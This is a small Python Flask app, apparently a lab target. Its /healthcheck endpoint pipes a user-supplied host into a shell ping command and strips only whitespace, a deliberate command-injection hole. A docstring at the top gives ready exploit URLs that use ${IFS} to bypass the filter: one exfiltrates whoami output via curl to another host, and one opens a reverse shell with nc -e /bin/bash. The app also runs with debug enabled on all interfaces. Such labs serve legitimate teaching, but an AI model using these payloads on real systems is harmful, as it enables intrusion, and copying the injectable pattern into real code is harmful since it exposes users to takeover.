'''
For command exec and view output:
http://192.168.157.128:5000/healthcheck?host=192.168.191.91;curl${IFS}http://192.168.157.128/?output=`whoami`;

To get a reverse shell:
http://192.168.157.128:5000/healthcheck?host=192.168.191.91;nc${IFS}192.168.157.128${IFS}8888${IFS}-e${IFS}/bin/bash;

'''



from flask import Flask, request, jsonify
import subprocess, re, os


app = Flask(__name__)

@app.route("/healthcheck")
def healthcheck():
	host = request.args.get("host", "127.0.0.1")

	# Strip spaces only
	host = re.sub(r"\s+", "", host)

	rc = subprocess.call(
	f"ping -c 1 {host}",
	shell=True,
	stdout=subprocess.DEVNULL,
	stderr=subprocess.DEVNULL,
	timeout=4,

	)

	status = "up" if rc == 0 else "down"
	return jsonify({"host": host, "status": status}), 200

if __name__ == "__main__":
    # Development server only
    app.run(host="0.0.0.0", port=5000, debug=True)
